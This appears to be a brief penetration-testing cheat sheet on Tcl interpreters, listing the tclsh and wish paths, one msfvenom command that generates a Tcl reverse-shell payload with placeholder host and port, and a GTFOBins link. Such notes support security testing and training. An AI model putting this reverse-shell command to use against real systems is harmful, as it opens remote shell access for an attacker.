# Manual

## 01 - Common Files

```
/usr/bin/tclsh
/usr/bin/wish
```

## 02 - Generate Payloads

```
$ msfvenom -p cmd/unix/reverse_tclsh lhost=<IP> lport=<PORT>
```

---
## References

### GTFOBins

- [GTFOBins: tclsh](https://gtfobins.github.io/gtfobins/tclsh/)